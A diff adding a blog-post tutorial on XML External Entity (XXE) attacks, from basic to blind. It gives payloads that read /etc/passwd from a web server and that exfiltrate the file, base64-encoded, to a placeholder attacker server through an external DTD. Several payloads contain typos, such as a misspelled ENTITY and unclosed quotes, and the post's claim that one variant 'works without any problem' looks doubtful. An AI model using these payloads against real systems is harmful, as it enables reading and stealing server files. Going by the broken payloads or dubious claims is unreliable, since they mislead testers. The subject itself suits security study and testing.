@@ -1,0 +1,164 @@
+---
+layout: post
+title: "Understanding XXE From Basic To Blind"
+subtitle: "What is XXE, How to Confirm, How to exploit, How Blind XXE Works, Any alternative Ways"
+date: 2018-11-10 23:45:13 -0400
+background: '/img/posts/01.jpg'
+---
+
+<p>
+Hi All, <br><br>
+
+In this post we will cover these following topics.<br><br>
+
+What is XXE?<br>
+How to confirm XXE?<br>
+How Exploit Basic XXE?<br>
+How Blind XXE works?<br>
+and a alternative of blind XXE payload.<br><br>
+
+But first let's understand some basic keywords.<br><br>
+
+<b>Entity</b>  Entities reference data that act as an abbreviation or can be found at an external location. Syntax:- <b>&test;</b><br><br>
+
+<b>Internal Entity: </b>If an entity is declared within a DTD it is called as internal entity.<br>
+<blockquote>Syntax: &lt;!ENTITY entity_name "entity_value"&gt;</blockquote><br>
+
+<b>External Entity: </b>If an entity is declared outside a DTD it is called as external entity. Identified by 'SYSTEM'.<br>
+<blockquote>Syntax:- &lt;!ENTITY entity_name SYSTEM "entity_value"&gt;</blockquote>
+
+<b>Parameter Entity*</b>The purpose of a parameter entity is to enable you to create reusable sections of replacement text. (If not understood, You will understand more clearly in later.)<br>
+
+<blockquote>Syntax:-&lt;!ENTITY % entity "another entity (Internal or External)"&gt;<br>
+</blockquote>
+
+<h2 class="section-heading">What is XXE?</h2>
+
+<p>XXE is a short of XML External Entity, which is a vulnerablity found when misconfiguration XML parser parses enternal entities.<br><br>
+There are two types of XXE:- <br><br>
+
+1. Basic.<br>
+2. Blind.<br>
+
+Basic one:-<br><br>
+
+For ex you have a url with a parameter that parses XML data somthing like this:- 'http://myapp.com/somefile.php?xml=<xml_data>'<br><br></p>
+
+<p>Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. You have to confirm the vulnerability existence and this can be done by something like this.</p>
+
+
+<b>Payload 1</b>
+
+<blockquote>
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE root [<br>
+&lt;!ENTITY test SYSTEM 'http://yourserverip/'&gt;]><br>
+&lt;root&gt;&test;&lt;/root&gt;</blockquote>
+
+<p>Now let's understand this. <br><br>
+
+1.First we declare the xml Syntax, now, we define DOCTYPE to define the contents of XML body,<br> 
+2.After that, we define root element after the DOCTYPE i.e. root, next, we define the Entity and that entity contains SYSTEM attribute which indicate that the entity is External.<br>
+3.After that we define our server's ip because we want to let the target server to send the request to us.<br></p>
+
+</p>Now when you give that payload to mis-configured XML parser, the mis-configured XML parser will parse the entity <blockquote>&test;</blockquote> and we define our server ip, So, it will process our External entity by <b>requesting to your server ip</b><br><br>
+
+So if you got a new connection in the log file then it is confirmed that you have found XXE.</p>
+
+<h2 class="section-heading">Now it's time to exploit it.</h2>
+
+<p>Our main target is to read local files of the web server and this can be done using this payload </p>
+
+<blockquote>
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE root [<br>
+&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]><br>
+&lt;root&gt;&test;&lt;/root&gt;</blockquote>
+
+<p>The xml parser will process this payload as same as above but instead of requesting to your server now it will request to locally, with the file protocol, it will grep the file contents and shown to us. Hence, we can read local file of the webserver.</p>
+
+<h2 class="section-heading" >What if the xml data is not showing to us? (Blind XXE Case)</h2>
+
+<p>Okay,<br><br>
+
+Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.<br><br>
+
+So we also needed to blind means we have to use blind payload which will grep the contents of the local files of the webserver and send the contents to our server. Sound interesting, let's see how this whole theory works and also let's see that if we have some alternatives to do that.</p>
+
+<b>Payload 2</b>
+
+<p>
+<blockquote>
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE root [<br>
+&lt;!ENTITY test SYSTEM 'http://yourserverip/xml.dtd'&gt; %test; %exe]><br>
+&lt;root&gt;&entity;&lt;/root&gt;</blockquote>
+
+Your xml.dtd contents:- <br><br>
+
+<blockquote>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;`
+`&lt;!ENTIY % exe "&lt;!ENTITY entity SYSTEM 'http://yourserver/%file;'&gt;"&gt;`<br></blockquote>
+
+Lot's of code to understand:-<br><br>
+
+> we are using External dtd file i.e. <b>%test;</b>. So first the xml parser will parse this entity and make a request to your web-server for getting the contents of dtd file. Now, in that dtd file we define some entities to process.<br><br>
+
+<b>%exe;</b> This will make another general entity i.e. &entity; and that entity will make a request to our server with the *file contents.* which was found by the <b>%file;</b><br><br>
+
+>When the xml parser parses the entity <b>%file;</b>, then that entity will grep the file contents of local files of the server (which is our main target). <br>
+> We are using php filter to get the file contents to bypass any restrictions.<br>
+> Now attacker can log the request and reconstruct the file contents. 
+</p>
+
+<p>Make sense?</p>
+
+<p>Let's see how all this works.</p>
+
+<video src="/bandicam 2018-11-04 23-35-26-024.mp4" width="320" height="200" controls preload></video>
+
+<p>Cool. </p>
+
+Now, <b>Have anyone arise a question that why we call the dtd from attacker's server? Why not this below payload works?</b>
+
+<p><b>Payload 3</b>
+
+<blockquote>
+
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE root [`<br>
+&lt;!ENTITY % filecontents SYSTEM 'file:///etc/passwd&gt;<br>
+&lt;!ENTITY test SYSTEM 'http://yourserver/%filecontents;'&gt;]&gt;<br>
+&lt;root>&test;&lt;/root&gt;<br>
+
+</blockquote>
+
+<p>this would be easier than before? Yes it is, but it is not going to work. 
+</p>
+
+<p>According to this <a href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset">XML_DOC</a>, parameter entity can't be called inside the DTD subset, they can be called in the External subset (like we did in Payload no 2). It will be forbidden, hence you will get the forbidden error.</p>
+
+<p>So that's the reason why we can't run above payload.</p>
+<p>Let's try another payload:-
+</p>
+
+<p><b>Payload 4</b>
+
+<blockquote>
+&lt;?xml version="1.0"?&gt;<br>
+&lt;!DOCTYPE root [`<br>
+&lt;!ENTITY filecontents SYSTEM 'file:///etc/passwd&gt;<br>
+&lt;!ENTITY test SYSTEM 'http://yourserver/&filecontents;'&gt;]&gt;<br>
+&lt;root>&test;&lt;/root&gt;<br>
+</blockquote>
+
+<p>So this payload works without any problem but your entity (oops, wrong type) will act as string(that's the correct type), because entity should be in root tag, if it is not it will act as String.</p>
+
+<p>That's all guys, I just want to share because I want. :). Any thing you want to edit please let me know.
+</p>
+<p>Hope you like this read. 
+</p>
+
+<p>Have a good hacking day.
+</p>
+
+<p>Thanks</p>
